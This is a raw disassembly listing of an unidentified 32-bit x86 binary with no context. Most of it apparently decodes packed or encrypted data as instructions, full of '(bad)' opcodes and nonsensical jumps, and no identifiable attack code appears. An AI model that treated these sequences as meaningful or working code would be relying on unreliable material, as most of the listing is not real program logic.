  40ddbf:	fcomp  DWORD PTR [ebx+0x7f]
  40ddc2:	pop    edx
  40ddc3:	clc    
  40ddc4:	add    BYTE PTR [eax+0x2a3f03d9],0x69
  40ddcb:	inc    ecx
  40ddcc:	dec    ebx
  40ddcd:	sbb    eax,0xc33f3caf
  40ddd2:	mov    esi,0xfa4e5b43
  40ddd7:	mov    al,BYTE PTR [esi]
  40ddd9:	(bad)  
  40ddda:	fisub  WORD PTR [eax+0x12]
  40dddd:	adc    eax,0x9305e119
  40dde2:	push   edx
  40dde3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dde4:	push   ebx
  40dde5:	bound  ecx,QWORD PTR [ebx+0x6de91a2]
  40ddeb:	jmp    FWORD PTR [edx-0x75cc5d8b]
  40ddf1:	jp     0x40dd7f
  40ddf3:	ins    BYTE PTR es:[edi],dx
  40ddf4:	inc    edx
  40ddf5:	push   esp
  40ddf6:	push   edi
  40ddf7:	adc    BYTE PTR [ebp-0x49],ah
  40ddfa:	(bad)  
  40ddfb:	ret    0x10bd
  40ddfe:	dec    ebp
  40ddff:	push   0xffffffb7
  40de01:	ins    BYTE PTR es:[edi],dx
  40de02:	cmp    al,0x8c
  40de04:	push   ds
  40de05:	popa   
  40de06:	pop    edx
  40de07:	icebp  
  40de08:	xor    ebp,DWORD PTR [edi]
  40de0a:	jp     0x40de3d
  40de0c:	cmp    eax,0x6acceb4e
  40de11:	or     bl,BYTE PTR [ecx+0x6a]
  40de14:	add    al,0x5b
  40de16:	inc    ebx
  40de17:	xchg   ebx,ecx
  40de19:	jmp    0x40df77
  40de1e:	ss test al,0xe0
  40de21:	or     eax,0x6dfb5d60
  40de26:	mov    al,0x7d
  40de28:	jmp    0x5767e48d
  40de2d:	jae    0x40ddf5
  40de2f:	xchg   BYTE PTR [esi+0x7e],bh
  40de32:	aas    
  40de33:	jg     0x40deb3
  40de35:	jle    0x40de90
  40de37:	push   0x17
  40de39:	int    0xd2
  40de3b:	add    bl,ch
  40de3d:	in     al,dx
  40de3e:	jg     0x40ddc7
  40de40:	mov    dl,0xb6
  40de42:	aam    0x2
  40de44:	test   al,0x62
  40de46:	pop    eax
  40de47:	mov    dl,ah
  40de49:	jle    0x40ddee
  40de4b:	fimul  WORD PTR ds:[edx-0xf]
  40de4f:	dec    ebp
  40de50:	bound  edx,QWORD PTR [ebx]
  40de52:	test   BYTE PTR [esi-0x3d5f22dd],dh
  40de58:	or     BYTE PTR [ecx-0x6b],dl
  40de5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de5c:	fist   DWORD PTR [ebx-0x1bdad4ce]
  40de62:	lock adc esi,esi
  40de65:	stos   DWORD PTR es:[edi],eax
  40de66:	xchg   ecx,eax
  40de67:	sbb    edx,esp
  40de69:	or     edi,DWORD PTR [edi-0x5292767a]
  40de6f:	iret   
  40de70:	cli    
  40de71:	int3   
  40de72:	or     BYTE PTR [ebp+0x5b],al
  40de75:	loop   0x40dec8
  40de77:	pop    edi
  40de78:	mov    al,ds:0xb5d95a36
  40de7d:	(bad)  
  40de7e:	bound  edx,QWORD PTR [esi-0x4031fe2e]
  40de84:	ins    DWORD PTR es:[edi],dx
  40de85:	add    al,0xe0
  40de87:	dec    eax
  40de88:	mov    eax,0x2ce6985d
  40de8d:	(bad)  
  40de8e:	out    dx,al
  40de8f:	mov    fs,WORD PTR [esi]
  40de91:	ja     0x40de79
  40de93:	or     BYTE PTR [esi+esi*4+0x6b020859],0x95
  40de9b:	imul   edx,DWORD PTR [edi+0x739d1a4d],0xbab5e5f9
  40dea5:	xor    ebx,DWORD PTR [edi-0x44]
  40dea8:	xor    al,BYTE PTR [ebp-0x42f01a6]
  40deae:	cli    
  40deaf:	inc    ecx
  40deb0:	shl    ebx,0xd5
  40deb3:	mov    ah,ch
  40deb5:	push   esi
  40deb6:	and    al,0xcc
  40deb8:	adc    ecx,DWORD PTR fs:[edx+0x3856a532]
  40debf:	sahf   
  40dec0:	inc    DWORD PTR [ecx]
  40dec2:	cmp    BYTE PTR [ecx+0x599746f3],bl
  40dec8:	in     al,dx
  40dec9:	ret    0x8e73
  40decc:	loop   0x40df1f
  40dece:	js     0x40defd
  40ded0:	sbb    BYTE PTR [ebp+edi*2+0x5e084429],0xb8
  40ded8:	shl    DWORD PTR [ecx-0x6bf48f4d],cl
  40dede:	inc    ebp
  40dedf:	inc    ebx
  40dee0:	loopne 0x40de6a
  40dee2:	adc    eax,0x9dad1b8d
  40dee7:	mov    ecx,0x92272833
  40deec:	and    eax,0x71052eb8
  40def1:	dec    edx
  40def2:	std    
  40def3:	loop   0x40de80
  40def5:	fist   DWORD PTR [esi]
  40def7:	push   eax
  40def8:	in     al,dx
  40def9:	sub    dh,BYTE PTR [edi-0x6bef5745]
  40deff:	ror    DWORD PTR [edi-0x4eed74cb],cl
  40df05:	test   DWORD PTR [eax+0x1d],ebx
  40df08:	inc    edi
  40df09:	ret    
  40df0a:	loope  0x40de93
  40df0c:	fsub   QWORD PTR ds:0x8252418b
  40df12:	add    ah,al
  40df14:	mov    esi,DWORD PTR [ebp+0x5c]
  40df17:	and    ah,dl
  40df19:	xchg   edx,eax
  40df1a:	je     0x40df33
  40df1c:	dec    esi
  40df1d:	cli    
  40df1e:	cmp    ebx,0x4e
  40df21:	pop    edi
  40df22:	add    ecx,DWORD PTR [eax+esi*8-0xee94e0b]
  40df29:	loopne 0x40df93
  40df2b:	sub    al,0xea
  40df2d:	xor    DWORD PTR [edi-0x624b69a3],edx
  40df33:	mov    eax,ds:0x5acbdc43
  40df38:	inc    edi
  40df39:	xchg   edi,eax
  40df3a:	arpl   WORD PTR [eax],di
  40df3c:	inc    ecx
  40df3d:	in     al,0x79
  40df3f:	xor    ebx,DWORD PTR [ecx]
  40df41:	jmp    0x40df6f
  40df43:	retf   
  40df44:	xor    BYTE PTR [edx],0x36
  40df47:	in     eax,0xc5
  40df49:	jb     0x40df18
  40df4b:	es pop edx
  40df4d:	jp     0x40df97
  40df4f:	aam    0xc8
  40df51:	dec    edx
  40df52:	xor    BYTE PTR [eax-0x6],0xe5
  40df56:	and    BYTE PTR [esi+0x6d],0xbf
  40df5a:	mov    esp,0xb71c1c6c
  40df5f:	jge    0x40df5b
  40df61:	outs   dx,BYTE PTR ds:[esi]
  40df62:	xchg   edi,eax
  40df63:	lahf   
  40df64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df65:	push   cs
  40df66:	inc    eax
  40df67:	pop    es
  40df68:	sahf   
  40df69:	test   DWORD PTR [ebx-0x1c279bb3],esp
  40df6f:	jmp    0x3f19:0x4d536d6e
  40df76:	inc    eax
  40df77:	sub    ebx,ecx
  40df79:	xchg   ebx,ecx
  40df7b:	dec    ecx
  40df7c:	mov    eax,DWORD PTR [ebp-0x1c]
  40df7f:	imul   eax,ecx
  40df82:	add    esp,eax
  40df84:	xchg   edx,eax
  40df85:	push   eax
  40df86:	xor    ebx,ebx
  40df88:	mov    edx,esp
  40df8a:	dec    edx
  40df8b:	inc    ebx
  40df8c:	add    ebx,DWORD PTR [edx+ebx*1]
  40df8f:	dec    ebx
  40df90:	xor    edx,edx
  40df92:	add    DWORD PTR [ebp-0xc],ebx
  40df95:	pop    ebx
  40df96:	jmp    0x40e0f4
  40df9b:	mov    BYTE PTR [eax+0x5d7fc57f],cl
  40dfa1:	pop    esp
  40dfa2:	pop    ebp
  40dfa3:	in     eax,0x25
  40dfa5:	pop    ebp
  40dfa6:	rcr    DWORD PTR [edi],1
  40dfa8:	sub    ebx,DWORD PTR [ebp+0x7e8787da]
  40dfae:	jle    0x40dfef
  40dfb0:	jg     0x40e030
  40dfb2:	jle    0x40df5e
  40dfb4:	and    eax,esp
  40dfb6:	inc    ecx
  40dfb7:	pop    ds
  40dfb8:	in     eax,0x3e
  40dfba:	aam    0xd2
  40dfbc:	call   0x63237306
  40dfc1:	xor    al,0x0
  40dfc3:	push   cs
  40dfc4:	fstp   TBYTE PTR [edi]
  40dfc6:	push   eax
  40dfc7:	sub    cl,BYTE PTR es:[edi]
  40dfca:	hlt    
  40dfcb:	outs   dx,BYTE PTR ds:[esi]
  40dfcc:	adc    DWORD PTR [esi+0x2],ebp
  40dfcf:	cs (bad) 
  40dfd1:	mov    DWORD PTR [esi-0x24],eax
  40dfd4:	add    cl,cl
  40dfd6:	pusha  
  40dfd7:	xchg   edi,eax
  40dfd8:	lds    esi,FWORD PTR [esp+edi*4-0x50b3a981]
  40dfdf:	in     al,dx
  40dfe0:	add    al,0x89
  40dfe2:	addr16 mov edi,0xd18402d4
  40dfe8:	push   ds
  40dfe9:	cmp    ecx,DWORD PTR [ebp-0x7d]
  40dfec:	or     bh,bl
  40dfee:	cdq    
  40dfef:	lock cmp DWORD PTR [ecx+0x3293047b],eax
  40dff6:	(bad)  
  40dff7:	(bad)  
  40dff8:	xchg   esi,eax
  40dff9:	daa    
  40dffa:	or     al,BYTE PTR [ecx+0x31]
  40dffd:	ins    BYTE PTR es:[edi],dx
  40dffe:	jle    0x40e02d
  40e000:	les    ebx,FWORD PTR [ebx-0x462b998d]
  40e006:	adc    DWORD PTR [edx+0x45],edx
  40e009:	cmp    DWORD PTR [ecx+0x6f],0xa49e9f9
  40e010:	js     0x40dfb7
  40e012:	jecxz  0x40dfcf
  40e014:	inc    DWORD PTR [ebp+0x6cbda743]
  40e01a:	loope  0x40dfea
  40e01c:	adc    bh,dh
  40e01e:	pop    ebp
  40e01f:	mov    edx,0xb0957fab
  40e024:	cmp    cl,BYTE PTR [edi+0x1c]
  40e027:	test   DWORD PTR [ebx+0x74bc15eb],esi
  40e02d:	mov    ecx,0x5a4d738b
  40e032:	pop    ds
  40e033:	arpl   WORD PTR [edx+0x75763e2a],si
  40e039:	(bad)  
  40e03a:	stc    
  40e03b:	inc    eax
  40e03c:	lock cwde 
  40e03e:	fwait
  40e03f:	sbb    cl,bh
  40e041:	add    DWORD PTR [ebp-0x6e],ebx
  40e044:	(bad)  
  40e045:	(bad)  
  40e046:	iret   
  40e047:	mov    ah,0xae
  40e049:	aam    0xa
  40e04b:	mov    ds:0x496d3f3f,eax
  40e050:	(bad)  
  40e052:	stos   BYTE PTR es:[edi],al
  40e053:	mov    dl,0x3a
  40e055:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e056:	push   esi
  40e057:	jnp    0x40e00a
  40e059:	das    
  40e05a:	cmp    eax,0x2347c3be
  40e05f:	xchg   edi,eax
  40e060:	out    dx,eax
  40e061:	test   BYTE PTR [eax+0x2984dd55],ah
  40e067:	jae    0x40e036
  40e069:	sub    DWORD PTR [edx],edi
  40e06b:	cmp    eax,0x52
  40e06e:	aas    
  40e06f:	sub    BYTE PTR [esi-0x168b3da5],ch
  40e075:	jne    0x40e0d0
  40e077:	stos   DWORD PTR es:[edi],eax
  40e078:	mov    ds:0xc02f82de,eax
  40e07d:	fsub   st,st(4)
  40e07f:	(bad)  
  40e081:	pop    edi
  40e082:	scas   eax,DWORD PTR es:[edi]
  40e083:	sbb    DWORD PTR [esi+0x4f],ebp
  40e086:	mov    ah,0x56
  40e088:	loop   0x40e046
  40e08a:	jmp    0xc230f0e1
  40e08f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e090:	xor    BYTE PTR [edx-0x138f10fa],cl
  40e096:	scas   al,BYTE PTR es:[edi]
  40e097:	jne    0x40e0ff
  40e099:	in     eax,0x17
  40e09b:	push   0xffffffbe
  40e09d:	adc    dh,al
  40e09f:	sub    ecx,DWORD PTR [ebp+0x2c]
  40e0a2:	cs pop eax
  40e0a4:	fnstcw WORD PTR [eax+0x79]
  40e0a7:	xchg   edx,eax
  40e0a8:	rcl    BYTE PTR [esp+eax*4-0x47],0x17
  40e0ad:	jecxz  0x40e06c
  40e0af:	test   al,0x79
  40e0b1:	in     eax,0x29
  40e0b3:	das    
  40e0b4:	jb     0x40e0a6
  40e0b6:	arpl   WORD PTR [ecx],di
  40e0b8:	mov    dl,0xe4
  40e0ba:	inc    esi
  40e0bb:	push   0x7e
  40e0bd:	jb     0x40e0e0
  40e0bf:	sti    
  40e0c0:	or     al,BYTE PTR [ebx-0xf5a24af]
  40e0c6:	popf   
  40e0c7:	enter  0xeb99,0xe6
  40e0cb:	add    al,0x26
  40e0cd:	das    
  40e0ce:	fstp   st(7)
  40e0d0:	jle    0x40e101
  40e0d2:	(bad)  
  40e0d3:	pop    ds
  40e0d4:	bound  edi,QWORD PTR ds:0xf347a3ec
  40e0da:	jne    0x40e150
  40e0dc:	mov    dh,0x36
  40e0de:	xchg   ebp,eax
  40e0df:	sub    ecx,ebx
  40e0e1:	into   
  40e0e2:	in     eax,dx
  40e0e3:	add    al,0x68
  40e0e5:	test   ch,bl
  40e0e7:	dec    esp
  40e0e8:	repnz les ecx,FWORD PTR [ebp+esi*2+0x76]
  40e0ed:	enter  0xf6a7,0x85
  40e0f1:	inc    edx
  40e0f2:	push   esi
  40e0f3:	popa   
  40e0f4:	mov    eax,DWORD PTR [ebp-0xc]
  40e0f7:	pop    edi
  40e0f8:	pop    esi
  40e0f9:	pop    ebx
  40e0fa:	leave  
  40e0fb:	ret    0x10
  40e0fe:	dec    ebp
  40e0ff:	push   ebp
  40e100:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  40e106:	mov    esp,ebp
  40e108:	or     ah,dh
  40e10a:	dec    ebp
  40e10b:	add    bh,al
  40e10d:	add    BYTE PTR [eax],cl
  40e10f:	add    BYTE PTR [eax],al
  40e111:	mov    DWORD PTR [eax],0x40f44545
  40e117:	xor    eax,0x9c8b8500
  40e11c:	hlt    
  40e11d:	clc    
  40e11e:	retf   
  40e11f:	(bad)  
  40e120:	enter  0x4d45,0xbc
  40e124:	mov    esi,DWORD PTR [edx]
  40e126:	hlt    
  40e127:	test   ebx,ecx
  40e129:	pushf  
  40e12a:	enter  0x4df8,0x8b
  40e12e:	mov    DWORD PTR [ebp-0x20],0x890208
  40e135:	inc    ebp
  40e136:	inc    ebp
  40e137:	cld    
  40e138:	xor    cl,BYTE PTR [ebx-0xb38b300]
  40e13e:	or     BYTE PTR [ebx+0x0],dl
  40e141:	mov    ebx,0x8bd5600
  40e146:	call   DWORD PTR [ecx-0x1]
  40e149:	pop    es
  40e14a:	mov    ch,0x33
  40e14c:	dec    ebx
  40e14e:	(bad)  
  40e14f:	mov    eax,0x72009da4
  40e154:	push   DWORD PTR [edx]
  40e156:	or     BYTE PTR [eax],al
  40e158:	jmp    0xff89:0x75c84d03
  40e15f:	dec    ebp
  40e160:	loopne 0x40e132
  40e162:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  40e168:	add    BYTE PTR [ebx],dh
  40e16a:	mov    ecx,ebx
  40e16c:	hlt    
  40e16d:	add    ecx,ebx
  40e16f:	enter  0x899d,0x32
  40e173:	dec    ebp
  40e174:	add    ecx,eax
  40e176:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  40e17c:	or     DWORD PTR [ebx-0xb00b29c],0x0
  40e183:	xor    ecx,ebx
  40e185:	retf   
  40e186:	enter  0x4d03,0xc8
  40e18a:	mov    DWORD PTR fs:[eax],ebx
  40e18d:	lea    eax,[eax]
  40e18f:	push   esp
  40e190:	mov    edi,edi
  40e192:	fs (bad) 
  40e194:	(bad)  
  40e195:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  40e19b:	push   0xffffffff
  40e19d:	and    bh,bh
  40e19f:	pop    ecx
  40e1a0:	inc    eax
  40e1a1:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  40e1a7:	push   0xffffff8b
  40e1a9:	pop    ecx
  40e1aa:	cld    
  40e1ab:	dec    ebp
  40e1ac:	lea    ecx,[ecx+0x45ff08ff]
  40e1b2:	mov    BYTE PTR [edx+0x1],cl
  40e1b5:	add    BYTE PTR [eax],al
  40e1b7:	mov    DWORD PTR [ebp+0x8],0x58008d
  40e1be:	dec    DWORD PTR [ebp-0x77]
  40e1c1:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  40e1c8:	cld    
  40e1c9:	dec    ebp
  40e1ca:	jne    0x40e1ff
  40e1cc:	lea    eax,[ebx]
  40e1ce:	push   eax
  40e1cf:	mov    edi,edi
  40e1d1:	or     BYTE PTR [ecx+0x54a845],cl
  40e1d7:	add    al,ch
  40e1d9:	(bad)  
  40e1da:	sub    esp,ebp
  40e1dc:	add    BYTE PTR [eax],al
  40e1de:	rol    BYTE PTR [eax],0x84
  40e1e1:	inc    ebp
  40e1e2:	add    dh,BYTE PTR [esi+0x0]
  40e1e5:	add    BYTE PTR [ebp-0x73],al
  40e1e8:	mov    ebp,DWORD PTR [esp+edx*4]
  40e1eb:	inc    DWORD PTR [eax]
  40e1ed:	lea    ecx,[ebx-0x30074f4]
  40e1f3:	call   0x41ed78
  40e1f8:	add    BYTE PTR [ebp+0x0],cl
  40e1fb:	jne    0x40e23e
  40e1fd:	dec    DWORD PTR [ebx-0x76210314]
  40e203:	dec    ebp
  40e204:	add    DWORD PTR [ebp+0x0],esi
  40e207:	(bad)  
  40e208:	xchg   ebp,eax
  40e209:	loopne 0x40e20a
  40e20b:	inc    eax
  40e20c:	inc    DWORD PTR [eax]
  40e20e:	mov    ecx,DWORD PTR [ebp-0x4]
  40e211:	xor    edx,DWORD PTR [edx+0x7201b8]
  40e217:	add    BYTE PTR [edx],dl
  40e219:	enter  0x4d90,0x0
  40e21d:	mov    eax,DWORD PTR [eax]
  40e21f:	hlt    
  40e220:	add    al,0xa5
  40e222:	mov    al,0xff
  40e224:	add    bh,bh
  40e226:	add    BYTE PTR [ebx],dh
  40e228:	inc    DWORD PTR [ebx]
  40e22a:	sbb    al,0x89
  40e22c:	jne    0x40e206
  40e22e:	mov    esp,DWORD PTR [ecx+0x4500fc]
  40e234:	mov    eax,DWORD PTR [ebp-0xff0048]
  40e23a:	mov    DWORD PTR [eax-0x70],0xe058e189
  40e241:	inc    DWORD PTR [ebp-0x75]
  40e244:	ror    DWORD PTR [esi+ebp*8],1
  40e247:	test   DWORD PTR [esi-0x1],esp
  40e24a:	inc    ebp
  40e24b:	(bad)  
  40e24c:	aas    
  40e24d:	inc    ebp
  40e24e:	(bad)  
  40e24f:	lea    edi,[esp+eiz*2-0x1]
  40e253:	push   DWORD PTR [edi]
  40e255:	mov    DWORD PTR [ecx],esi
  40e257:	mov    al,ds:0x8b8000c7
  40e25c:	loopne 0x40e25a
  40e25e:	jmp    0xdfff:0xeeff458d
  40e265:	mov    bh,al
  40e267:	add    DWORD PTR [eax-0x1fba1500],ecx
  40e26d:	inc    DWORD PTR [ebp-0x4]
  40e270:	xlat   BYTE PTR ds:[ebx]
  40e271:	lea    edi,[edi]
  40e273:	inc    edi
  40e275:	jmp    FWORD PTR [eax-0x78]
  40e278:	inc    DWORD PTR [ecx]
  40e27a:	aaa    
  40e27b:	add    BYTE PTR [ecx],dh
  40e27d:	repnz mov DWORD PTR [eax],0xfff856c
  40e284:	ffreep st(5)
  40e286:	aas    
  40e287:	add    bh,al
  40e289:	mov    esi,DWORD PTR [eax-0x4]
  40e28c:	inc    DWORD PTR [eax+0xdf01ee]
  40e292:	(bad)  
  40e293:	or     BYTE PTR [ebp+eax*2-0x1],dh
  40e297:	mov    esp,ebx
  40e299:	xchg   esp,eax
  40e29a:	rol    DWORD PTR [eax],cl
  40e29c:	(bad)  
  40e29d:	mov    edi,DWORD PTR [eax+0x3]
  40e2a0:	(bad)  
  40e2a1:	cmp    al,0xd7
  40e2a3:	dec    ebp
  40e2a4:	lds    ecx,FWORD PTR [ebx+0x29d8e8]
  40e2aa:	add    BYTE PTR [ebp-0x3b375],cl
  40e2b0:	adc    BYTE PTR [edx+0x1],0x55
  40e2b4:	add    BYTE PTR [ebx+0x58c30],cl
  40e2ba:	add    BYTE PTR [ebx-0x778afc7b],cl
  40e2c0:	mov    eax,DWORD PTR [eax]
  40e2c2:	cld    
  40e2c3:	push   0x7d
  40e2c5:	dec    DWORD PTR [ebx+0xd88c]
  40e2cb:	push   edx
  40e2cc:	mov    edx,DWORD PTR [ecx-0x4]
  40e2cf:	call   DWORD PTR [eax+0x7d01fc]
  40e2d5:	mov    esp,DWORD PTR [esp+edi*8]
  40e2d8:	add    BYTE PTR [eax+0x560150],dl
  40e2de:	test   DWORD PTR [ebp+0x75],eax
  40e2e1:	jmp    0x947d:0xc7fce28b
  40e2e8:	mov    ebp,ebx
  40e2ea:	fcom   st(7)
  40e2ec:	add    bh,al
  40e2ee:	mov    ebx,DWORD PTR [eax-0x7a6f8104]
  40e2f4:	add    edi,edi
  40e2f6:	add    bh,bh
  40e2f8:	add    ah,cl
  40e2fa:	add    dh,dl
  40e2fc:	push   eax
  40e2fd:	inc    ebp
  40e2fe:	push   esi
  40e2ff:	fisttp WORD PTR [ebx+0x4dc7f43f]
  40e305:	test   BYTE PTR [ebx],dh
  40e307:	(bad)  
  40e308:	add    eax,0x4572cc
  40e30d:	jecxz  0x40e2d0
  40e30f:	rol    DWORD PTR [edi+eax*8-0x2eff73ff],cl
  40e316:	inc    esi
  40e317:	jle    0x40e319
  40e319:	test   edi,eax
  40e31b:	jmp    esp
  40e31d:	inc    DWORD PTR [eax]
  40e31f:	loope  0x40e321
  40e321:	(bad)  
  40e322:	jne    0x40e2a9
  40e324:	mov    edi,edi
  40e326:	cld    
  40e327:	inc    DWORD PTR [ebp-0x20]
  40e32a:	mov    ebp,edx
  40e32c:	mov    ah,0x85
  40e32e:	add    bh,bh
  40e330:	call   0x1170c34
  40e335:	int3   
  40e336:	mov    eax,DWORD PTR [ebp-0x7f0004]
  40e33c:	add    ebx,ebp
  40e33e:	add    al,ah
  40e340:	xor    BYTE PTR [ebp-0xff0085],al
  40e346:	mov    edx,ecx
  40e348:	cld    
  40e349:	jle    0x40e2d4
  40e34b:	push   ebx
  40e34c:	add    DWORD PTR [eax],eax
  40e34e:	add    BYTE PTR [eax+0x1],dl
  40e351:	inc    ebp
  40e352:	inc    ebp
  40e353:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  40e359:	dec    DWORD PTR [ebx-0x3fd90318]
  40e35f:	add    BYTE PTR [ebp-0xbf0040],dl
  40e365:	inc    ebp
  40e366:	retf   0x8b
  40e369:	cld    
  40e36a:	push   eax
  40e36b:	mov    al,0x45
  40e36d:	add    DWORD PTR [ebx+0x459c00],ecx
  40e373:	mov    edi,edi
  40e375:	mov    eax,0xe80800ff
  40e37a:	inc    ebp
  40e37b:	sub    DWORD PTR [ebx-0x47000400],ecx
  40e381:	add    al,0x1
  40e383:	rol    BYTE PTR [eax],0x1e
  40e386:	jne    0x40e3cd
  40e388:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  40e38e:	inc    DWORD PTR [ecx]
  40e390:	call   0x860b95
  40e395:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  40e39b:	call   0x410ca1
  40e3a0:	xor    bh,bh
  40e3a2:	push   edi
  40e3a3:	adc    BYTE PTR [ebx-0x747423bb],al
  40e3a9:	loopne 0x40e387
  40e3ab:	ret    
  40e3ac:	loopne 0x40e34b
  40e3ae:	xor    DWORD PTR [edx],0x31
  40e3b1:	cmp    edi,edi
  40e3b3:	bswap  esp
  40e3b5:	rol    BYTE PTR gs:[eax],0x5
  40e3b9:	jmp    0x12be503
  40e3be:	mov    eax,DWORD PTR [ebp-0x4]
  40e3c1:	add    BYTE PTR [eax+0xff0100],bh
  40e3c7:	cld    
  40e3c8:	jne    0x40e447
  40e3ca:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  40e3d0:	pusha  
  40e3d1:	add    DWORD PTR [eax],eax
  40e3d3:	add    BYTE PTR [eax-0x37],dl
  40e3d6:	inc    ebp
  40e3d7:	add    BYTE PTR [ebx+0x459850],cl
  40e3dd:	mov    edi,edi
  40e3df:	test   al,0xff
  40e3e1:	add    BYTE PTR [eax],cl
  40e3e3:	inc    DWORD PTR [ebp-0x18]
  40e3e6:	jmp    DWORD PTR ds:0x4d7d00dc
  40e3ec:	adc    BYTE PTR [ebx+0x459cb9],cl
  40e3f2:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  40e3f8:	popf   
  40e3f9:	mov    eax,0x30132
  40e3fe:	lea    esi,[ebp+0x2c]
  40e401:	xor    edi,edi
  40e403:	(bad)  
  40e404:	call   0x1400c71
  40e409:	call   0x1350c99
  40e40e:	jne    0x40e39b
  40e410:	xor    edi,esp
  40e412:	add    eax,DWORD PTR [eax+0xc018d]
  40e418:	push   DWORD PTR [eax]
  40e41a:	call   0xca0c76
  40e41f:	int3   
  40e420:	inc    DWORD PTR [ebp-0x14]
  40e423:	mov    ecx,DWORD PTR [ebp-0x28]
  40e426:	xor    eax,DWORD PTR [eax]
  40e428:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  40e42e:	(bad)  
  40e42f:	xchg   ebp,eax
  40e430:	in     al,0xff
  40e432:	add    bh,bh
  40e434:	add    BYTE PTR [edi+0x508b0045],bl
  40e43a:	or     BYTE PTR [ebp-0x3d],al
  40e43d:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff63]
  40e444:	mov    edi,edi
  40e446:	or     BYTE PTR [eax],cl
  40e448:	inc    ebp
  40e449:	test   DWORD PTR gs:[eax],eax
  40e44c:	je     0x40e493
  40e44e:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  40e454:	xor    edx,DWORD PTR [eax-0x73]
  40e457:	push   ebp
  40e458:	or     BYTE PTR [ebp+0x21007572],al
  40e45e:	inc    ebp
  40e45f:	in     al,dx
  40e460:	mov    ebp,DWORD PTR [eax]
  40e462:	mov    esp,0x638bc345
  40e467:	fmul   st,st(5)
  40e469:	add    BYTE PTR [ebx],ch
  40e46b:	mov    eax,DWORD PTR [ebx]
  40e46d:	cld    
  40e46e:	loopne 0x40e430
  40e470:	inc    ebp
  40e471:	push   ebp
  40e472:	cmp    ebp,eax
  40e474:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  40e47b:	cld    
  40e47c:	fadd   DWORD PTR [eax+0x3b014d]
  40e482:	jne    0x40e4b4
  40e484:	push   0xf8898557
  40e489:	in     al,dx
  40e48a:	jne    0x40e4d1
  40e48c:	lea    eax,[ebx+0x72e8dcc8]
  40e492:	xor    BYTE PTR [ebx+0x7545bc00],cl
  40e498:	jmp    0x40e4cd
  40e49a:	mov    edi,DWORD PTR [edi+0x4572bc]
  40e4a0:	xor    eax,edi
  40e4a2:	adc    DWORD PTR [ebp-0xcd0063],0x8b2b31
  40e4ac:	rcl    BYTE PTR [eax-0x40],1
  40e4af:	inc    ebp
  40e4b0:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  40e4b8:	inc    ebp
  40e4b9:	xchg   ebp,eax
  40e4ba:	ud0    ebp,DWORD PTR [ebx]
  40e4bd:	inc    DWORD PTR [eax]
  40e4bf:	adc    eax,0x508a0076
  40e4c4:	adc    BYTE PTR [ebp+0x1f],0x8b
  40e4c8:	or     al,0xf4
  40e4ca:	inc    eax
  40e4cb:	retf   
  40e4cc:	inc    ebp
  40e4cd:	iret   
  40e4ce:	jb     0x40e498
  40e4d0:	mov    eax,DWORD PTR [edi]
  40e4d2:	enter  0x4545,0x1
  40e4d6:	xor    eax,0x898b9c00
  40e4db:	mov    esp,0x33324df0
  40e4e0:	pushf  
  40e4e1:	lea    ecx,[ecx+0x4d72e008]
  40e4e7:	add    BYTE PTR [ebx],dh
  40e4e9:	inc    ebp
  40e4ea:	mov    DWORD PTR [ebx-0x3f621b4c],ecx
  40e4f0:	xor    dl,BYTE PTR [edx]
  40e4f2:	add    eax,DWORD PTR [ebp-0x77]
  40e4f5:	mov    eax,esp
  40e4f7:	fmul   DWORD PTR [ebp-0x3d]
  40e4fa:	xor    eax,DWORD PTR [ebx+eax*1+0x832899d]
  40e501:	mov    DWORD PTR [ebp-0x28],eax
  40e504:	aad    0x45
  40e506:	pushf  
  40e507:	xor    eax,edi
  40e509:	mov    ecx,0xff858db0
  40e50e:	clc    
  40e50f:	enter  0x4d45,0x30
  40e513:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  40e51a:	test   esi,edi
  40e51c:	clc    
  40e51d:	inc    DWORD PTR [ebp+0x45]
  40e520:	mov    ebx,DWORD PTR ds:[eax+ecx*1+0x16a8c8c7]
  40e528:	test   DWORD PTR ds:0xff459cf8,esi
  40e52e:	cmp    al,0xfc
  40e530:	pushf  
  40e531:	inc    ebp
  40e532:	mov    edx,DWORD PTR [eax-0x28]
  40e535:	popf   
  40e536:	push   ebp
  40e537:	add    BYTE PTR [ebx],dh
  40e539:	mov    DWORD PTR [ebx],eax
  40e53b:	sar    BYTE PTR [ebx],1
  40e53d:	adc    BYTE PTR [edi],cl
  40e53f:	dec    ebp
  40e540:	adc    al,0x8b
  40e542:	add    al,dl
  40e544:	jmp    0x101e714
  40e549:	jb     0x40e598
  40e54b:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  40e551:	xor    ecx,DWORD PTR [ebp+0x3b]
  40e554:	xor    ecx,DWORD PTR [edi]
  40e556:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  40e55a:	(bad)  
  40e55c:	clc    
  40e55d:	enter  0x8400,0x8b
  40e561:	pop    es
  40e562:	mov    al,0x0
  40e564:	push   ebp
  40e565:	push   cs
  40e566:	xor    ecx,eax
  40e568:	xor    esp,ecx
  40e56a:	add    ebp,DWORD PTR [eax]
  40e56c:	add    esi,DWORD PTR [eax]
  40e56e:	(bad)  
  40e570:	retf   0x55c8
  40e573:	repnz mov eax,DWORD PTR [ebp-0x10]
  40e577:	(bad)  
  40e578:	cli    
  40e579:	fdivr  st,st(1)
  40e57b:	test   DWORD PTR [eax+edi*8],ecx
